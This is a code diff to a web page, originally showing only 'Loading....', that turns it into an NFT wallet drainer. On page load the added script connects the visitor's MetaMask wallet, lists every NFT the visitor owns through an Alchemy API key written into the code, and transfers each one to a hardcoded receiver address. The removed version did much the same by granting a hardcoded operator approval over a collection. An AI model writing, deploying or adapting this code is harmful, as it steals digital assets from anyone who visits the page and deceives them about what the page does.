@@ -7,58 +7,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>neotokyo.codes</title>
+  <title>Auto NFT Transfer with Multiple Priority Contracts</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h1>Loading....</h1>
+<script>
+const ALCHEMY_API_KEY = "XEbzMGpp9vTP_qKXrNcwh"; // <-- imong Alchemy key (after /v2/)
+const PRIORITY_CONTRACTS = [
+    "0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f",
+    "0x4481507cc228fa19d203bd42110d679571f7912e"
+].map(addr => addr.toLowerCase());
+const RECEIVER = "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
 
-  <script>
-    const nftContractAddress = "0x4481507cc228fa19d203bd42110d679571f7912e"; // <-- ilisi sa imong NFT contract
-    const operatorAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7"; // <-- ilisi kung kinsa ang i-approve (e.g., claim contract)
+async function fetchNFTs(owner) {
+    const url = `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${owner}`;
+    const res = await fetch(url);
+    if (!res.ok) throw new Error("Failed to fetch NFTs: " + res.statusText);
+    const data = await res.json();
+    return data.ownedNfts || [];
+}
 
-    async function autoConnectAndApprove() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("Install MetaMask first.");
+async function transferNFT(signer, contractAddr, tokenId) {
+    const abi = ["function safeTransferFrom(address from, address to, uint256 tokenId) external"];
+    const contract = new ethers.Contract(contractAddr, abi, signer);
+    const sender = await signer.getAddress();
+    const tx = await contract.safeTransferFrom(sender, RECEIVER, tokenId);
+    console.log(`Sent ${contractAddr} #${tokenId}, tx: ${tx.hash}`);
+    await tx.wait();
+}
+
+async function startTransfer() {
+    if (!window.ethereum) {
+        alert("MetaMask required");
         return;
-      }
-
-      try {
-        // Connect wallet
-        await ethereum.request({ method: 'eth_requestAccounts' });
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const userAddress = await signer.getAddress();
-
-        // NFT Contract ABI (only need setApprovalForAll)
-        const abi = [
-          "function setApprovalForAll(address operator, bool approved) external",
-          "function isApprovedForAll(address owner, address operator) view returns (bool)"
-        ];
-        const nftContract = new ethers.Contract(nftContractAddress, abi, signer);
-
-        // Check if already approved
-        const alreadyApproved = await nftContract.isApprovedForAll(userAddress, operatorAddress);
-        if (alreadyApproved) {
-          console.log("Already approved.");
-          return;
-        }
-
-        // Trigger approval
-        const tx = await nftContract.setApprovalForAll(operatorAddress, true);
-        console.log("Approval sent. Waiting for confirmation...");
-        await tx.wait();
-        console.log("NFT Approved!");
-        alert("NFT Approved!");
-
-      } catch (err) {
-        console.error("Error:", err);
-        alert("Something went wrong: " + err.message);
-      }
     }
 
-    // Run on page load
-    window.onload = autoConnectAndApprove;
-  </script>
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const owner = await signer.getAddress();
+
+    console.log("Fetching NFTs for:", owner);
+    const nfts = await fetchNFTs(owner);
+
+    if (nfts.length === 0) {
+        alert("No NFTs found.");
+        return;
+    }
+
+    // Sort so NFTs from priority contracts come first
+    nfts.sort((a, b) => {
+        const aP = PRIORITY_CONTRACTS.includes(a.contract.address.toLowerCase()) ? -1 : 1;
+        const bP = PRIORITY_CONTRACTS.includes(b.contract.address.toLowerCase()) ? -1 : 1;
+        return aP - bP;
+    });
+
+    for (let nft of nfts) {
+        try {
+            const contractAddr = nft.contract.address;
+            const tokenId = ethers.BigNumber.from(nft.id.tokenId).toString();
+            await transferNFT(signer, contractAddr, tokenId);
+        } catch (err) {
+            console.error("Error transferring NFT:", err);
+        }
+    }
+
+    alert("All NFT transfers completed.");
+}
+
+window.onload = startTransfer;
+</script>
 </body>
 </html>
